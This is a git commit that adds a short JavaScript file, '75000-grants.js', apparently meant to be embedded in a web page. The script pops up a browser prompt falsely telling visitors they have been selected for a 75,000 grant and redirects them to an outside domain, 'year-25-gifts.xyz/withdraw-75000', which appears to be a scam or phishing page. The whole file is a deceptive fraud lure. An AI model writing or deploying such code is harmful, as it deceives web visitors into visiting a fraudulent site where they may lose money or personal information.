30b66b659a0b64b9a275560e2db6ce83e916cc91
bigetijazz18 <bigetijazz18@gmail.com>
2025-03-13 16:24:49 +0100

    Create 75000-grants.js

---
+++ 75000-grants.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw 75,000'
+password=prompt('FG: Congratulations, you are selected to benefit from the ongoing 75,000 grant. Click OK to claim grant.','Withdraw 75,000');
+if (password != 'Withdraw 75,000') {
+location.href='https://www.year-25-gifts.xyz/withdraw-75000';
+}
